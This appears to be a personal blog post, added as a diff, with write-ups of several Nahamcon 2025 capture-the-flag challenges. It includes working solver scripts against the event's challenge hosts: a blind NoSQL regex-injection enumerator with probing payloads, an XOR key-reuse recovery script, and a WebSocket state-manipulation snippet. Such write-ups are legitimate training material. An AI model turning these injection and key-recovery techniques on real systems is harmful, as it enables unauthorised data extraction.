@@ -1,0 +1,375 @@
+---
+layout: post
+title:  "Nahamcon 2025"
+date:   2025-08-01 18:27:43 -0400
+categories: CTFs
+---
+## Screenshot
+
+Warmups - Author: @John Hammond  
+
+Oh shoot! I accidentally took a screenshot just as I accidentally opened the dump of a `flag.zip` file in a text editor! Whoopsies, what a crazy accidental accident that just accidented!  
+  
+Well anyway, I think I remember the password was just **`password`**!  
+  
+**Download the file(s) below.**
+
+**Attachments:** Screenshot.png
+
+I put the photo in `https://www.imagetotext.info/` and fixed the small errors it made in translating the text back to the correct characters.
+```python
+import re
+
+hex_dump = """
+00000000: 504b 0304 3300 0100 6300 2f02 b55a 0000
+00000010: 0000 4300 0000 2700 0000 0800 0b00 666c
+00000020: 6167 2e74 7874 0199 0700 0200 4145 0300
+00000030: 003d 42ff d1b3 5f95 0314 24f6 8b65 c3f5
+00000040: 7669 f14e 8df0 003f e240 b3ac 3364 859e
+00000050: 4c2d bc3c 36f2 d4ac c403 7613 85af e4e3
+00000060: f90f bd29 d91b 614b a2c6 efde 11b7 1bcc
+00000070: 907a 72ed 504b 0102 3f03 3300 0100 6300
+00000080: 2f02 b55a 0000 0000 4300 0000 2700 0000
+00000090: 0800 2f00 0000 0000 0000 2080 6481 0000
+000000a0: 0000 666c 6167 2e74 7874 0a00 2000 0000
+000000b0: 0000 0100 1800 8213 8543 07ca db01 0000
+000000c0: 0000 0000 0000 0000 0000 0000 0000 0199
+000000d0: 0700 0200 4145 0300 0050 4b05 0600 0000
+000000e0: 0001 0001 0065 0000 0074 0000 0000 00
+"""
+
+# just get the hex digits
+hex_str = re.sub(r'^[0-9a-f]{8}:\s| ', '', hex_dump, flags=re.MULTILINE)
+hex_str = hex_str.replace('\n', '')
+
+# convert it to bytes
+binary_data = bytes.fromhex(hex_str)
+
+with open('flag.zip', 'wb') as f:
+    f.write(binary_data)
+```
+Unzip with password `password` and read flag.txt.
+
+___
+## The Martian
+
+Miscellaneous - Author: @John Hammond  
+  
+Wow, this file looks like it's from outta this world!  
+  
+**Download the file(s) below.**
+
+**Attachments:** challenge.martian
+
+I ran `binwalk -e challenge.martian` and got 4 `bzip2` files. I ran `bunzip2 C628` for example on each of the files. I got a photo containing the flag.
+
+___
+## Cryptoclock
+
+Cryptography - Author: @JohnHammond  
+  
+Just imagine it, _the Cryptoclock!!_ Just like you've seen in the movies, a magical power to be able to manipulate the world's numbers across time!!  
+  
+**Press the `Start` button on the top-right to begin this challenge.**
+
+**Attachments:** Server.py
+
+Contents of `server.py`:
+```python
+#!/usr/bin/env python3
+import socket
+import threading
+import time
+import random
+import os
+from typing import Optional
+
+def encrypt(data: bytes, key: bytes) -> bytes:
+    """Encrypt data using XOR with the given key."""
+    return bytes(a ^ b for a, b in zip(data, key))
+
+def generate_key(length: int, seed: Optional[float] = None) -> bytes:
+    """Generate a random key of given length using the provided seed."""
+    if seed is not None:
+        random.seed(int(seed))
+    return bytes(random.randint(0, 255) for _ in range(length))
+
+def handle_client(client_socket: socket.socket):
+    """Handle individual client connections."""
+    try:
+        with open('flag.txt', 'rb') as f:
+            flag = f.read().strip()
+        
+        current_time = int(time.time())
+        key = generate_key(len(flag), current_time)
+        
+        encrypted_flag = encrypt(flag, key)
+        
+        welcome_msg = b"Welcome to Cryptoclock!\n"
+        welcome_msg += b"The encrypted flag is: " + encrypted_flag.hex().encode() + b"\n"
+        welcome_msg += b"Enter text to encrypt (or 'quit' to exit):\n"
+        client_socket.send(welcome_msg)
+        
+        while True:
+            data = client_socket.recv(1024).strip()
+            if not data:
+                break
+                
+            if data.lower() == b'quit':
+                break
+                
+            key = generate_key(len(data), current_time)
+            encrypted_data = encrypt(data, key)
+            
+            response = b"Encrypted: " + encrypted_data.hex().encode() + b"\n"
+            client_socket.send(response)
+            
+    except Exception as e:
+        print(f"Error handling client: {e}")
+    finally:
+        client_socket.close()
+
+def main():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
+    server.bind(('0.0.0.0', 1337))
+    server.listen(5)
+    
+    print("Server started on port 1337...")
+    
+    try:
+        while True:
+            client_socket, addr = server.accept()
+            print(f"Accepted connection from {addr}")
+            client_thread = threading.Thread(target=handle_client, args=(client_socket,))
+            client_thread.start()
+    except KeyboardInterrupt:
+        print("\nShutting down server...")
+    finally:
+        server.close()
+
+if __name__ == "__main__":
+    main() 
+```
+
+I connect and see:
+```shell
+nc challenge.nahamcon.com 32472  
+Welcome to Cryptoclock!  
+The encrypted flag is: 724ef3e16d2568a1d4fed5198a0e28dc1345d2e2ddfc3fa5aaf20a1c63f71c91b7c046d2dcd1  
+Enter text to encrypt (or 'quit' to exit):  
+test  
+Encrypted: 6047e1f2
+```
+
+I know the plaintext I send, and I know the encrypted flag. They use the same key, so XORing them will cancel the key and get the flag. The key also takes in the `current_time` parameter which is important here.
+
+I need to connect and get the encrypted flag, send a string the same length, XOR that output, then XOR that with my known plaintext. 
+
+Here is my script:
+```python
+import socket
+import time
+
+def xor_bytes(a, b):
+    return bytes(x ^ y for x, y in zip(a, b))
+
+# connect
+s = socket.create_connection(("challenge.nahamcon.com", 32472))
+
+# Read until prompt
+data = s.recv(2048)
+print(data.decode())
+
+# Get the enc flag
+for line in data.decode().splitlines():
+    if "encrypted flag is" in line:
+        enc_flag_hex = line.split("encrypted flag is: ")[1]
+        break
+
+enc_flag = bytes.fromhex(enc_flag_hex)
+print("Enc flag:", enc_flag.hex())
+
+# string of "A"s as long as the flag
+known_plaintext = b"A" * len(enc_flag)
+s.sendall(known_plaintext + b"\n")
+
+response = s.recv(2048).decode()
+print(response)
+enc_known_hex = response.split("Encrypted: ")[1].strip()
+enc_known = bytes.fromhex(enc_known_hex)
+
+xor_result = xor_bytes(enc_flag, enc_known)
+recovered_flag = xor_bytes(xor_result, known_plaintext)
+
+print("Flag:", recovered_flag.decode())
+```
+___
+## TMCB 
+
+Web - Author: @John Hammond  
+  
+They thought they could impress us with One Million Checkboxes!? _Pfft..._ how about _**TWO** Million Checkboxes?!_  
+  
+Ya gotta check'em all!!  
+  
+**Press the `Start` button on the top-right to begin this challenge.**
+
+The site is 2 million check boxes. Once they are all checked you get the flag. I look at the source and see the webserver uses websockets to communicate the state of the checkboxes. Websockets keep a constant connection so I can run this in the web browser console:
+```javascript
+const ws = new WebSocket('ws://' + window.location.host + '/ws');
+
+ws.onopen = function() {
+    const allNumbers = Array.from({length: 2000000}, (_, i) => i);
+    // check
+    ws.send(JSON.stringify({
+        action: 'check',
+        numbers: allNumbers
+    }));
+    ws.send(JSON.stringify({ action: 'get_state' }));
+};
+```
+I need to kinda time this. If I refreshed the page too early sometimes only 1 million boxes would be checked. I finally refreshed once and got the flag.
+
+___
+## NoSequel
+
+Web - Author: @HuskyHacks  
+  
+It always struck me as odd that none of these movies ever got sequels! Absolute cinema.  
+  
+**Press the `Start` button on the top-right to begin this challenge.**
+
+The `/search` endpoint is vulnerable to NoSQL injection. 
+
+`{"$ne": null}` causes the error: `Error in movie search: unknown top level operator: $ne`.
+
+`{"$where": "sleep(100)"}` causes the error: `Error in movie search: The $where operator is not implemented in mongomock yet`.
+
+I find that this `flag: {$regex: flag}` returns a match but it prints no flag. I can use this as a check and enumerate the flag. I think this is blind NoSQL injection.
+{% raw %}
+```python
+import requests
+import string
+import re
+
+url = "http://challenge.nahamcon.com:30850/search"
+flag = "flag{"
+chars = string.ascii_letters + string.digits
+
+while not flag.endswith("}"):
+    for c in chars:
+        query = f"flag: {{$regex: ^{re.escape(flag + c)}}}"
+        response = requests.post(url, data={
+            "query": query,
+            "collection": "flags"
+        })
+        if "Pattern matched" in response.text:
+            flag += c
+            print(f"Progress: {flag}")
+            if c == "}":
+                print(f"\nFLAG FOUND: {flag}")
+                exit()
+            break
+    else:
+        print("No match :(")
+        break
+```
+{% endraw %}
+After some time I have the flag. It didnt print the final `}` but I got the flag so didnt troubleshoot the script.
+
+___
+## Method in the Madness
+
+Web - Author: BuildHackSecure @ HackingHub  
+  
+HackingHub has provided this CTF challenge!  
+
+**Press the `Start` button on the top-right to begin this challenge.**
+
+http://challenge.nahamcon.com:31645/
+
+Visiting this link I see 6 check boxes. The site led me to http://challenge.nahamcon.com:31645/interesting where I decided to curl the `/interesting` endpoint with different http methods. After using `OPTIONS`, `HEAD`, `GET`, `POST`, `PUT`, `DELETE`, and `PATCH` I got the flag! I'm not sure which one didnt count.
+
+___
+## flagsflagsflags
+
+Reverse Engineering - Author: @Kkevsterrr  
+
+Did you see the strings? One of those is right, I can just feel it.  
+  
+**Download the file(s) below.**
+
+**Attachments:** flagsflagsflags
+
+I rename the executable and run:
+```shell
+file FLAGS  
+FLAGS: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=8bbcb5450afeba98d27154e01464d3e4888218b7, stripped
+
+strings FLAGS | grep UPX  
+vUPX!  
+$Info: This file is packed with the UPX executable packer http://upx.sf.net $  
+$Id: UPX 4.22 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $  
+UPX!u  
+UPX!  
+UPX!
+_________________________________________________________________________________
+upx -d FLAGS  
+                      Ultimate Packer for eXecutables  
+                         Copyright (C) 1996 - 2024  
+UPX 4.2.2       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 3rd 2024  
+  
+       File size         Ratio      Format      Name  
+  --------------------   ------   -----------   -----------  
+  6918175 <-   3387920   48.97%   linux/amd64   FLAGS  
+  
+Unpacked 1 file.
+```
+I unpacked it with `upx` (a common executable packer). Now when I run `strings FLAGS | grep flag` I see TONS of fake flags. I output it to a text file like this `grep -oE 'flag\{[^}]+\}' WTF.txt > flaglist.txt`
+
+I make a bash script in order to brute force each of the 100,000 flags against the binary which acts as a way to verify. This took a while but it worked. 
+```bash
+#!/bin/bash
+
+BINARY="./FLAGS"
+WORDLIST="flaglist.txt"
+OUTPUT="valid_flags.txt"
+THREADS=2
+
+cleanup() {
+  echo " Stopping... Cleaning up."
+  pkill -P $$
+  exit 1
+}
+trap cleanup SIGINT
+
+> "$OUTPUT"
+
+test_flag() {
+  flag="$1"
+  output=$(echo "$flag" | "$BINARY" 2>&1)
+
+  if ! echo "$output" | grep -q "Incorrect flag!"; then
+    echo "$flag" >> "$OUTPUT"
+    echo "VALID: $flag"
+  fi
+}
+
+export -f test_flag
+export BINARY OUTPUT
+
+echo "Testing flags with $THREADS threads..."
+cat "$WORDLIST" | xargs -P "$THREADS" -I {} bash -c 'test_flag "{}"'
+
+echo "Done! Valid flags saved to $OUTPUT"
+```
+After a while I get this:
+```shell
+/flagcheck.sh  
+Testing flags with 2 threads...  
+VALID: flag{20dec9363618a397e9b2a0bf5a35b2e3}  
+^C Stopping... Cleaning up.
+```
+___
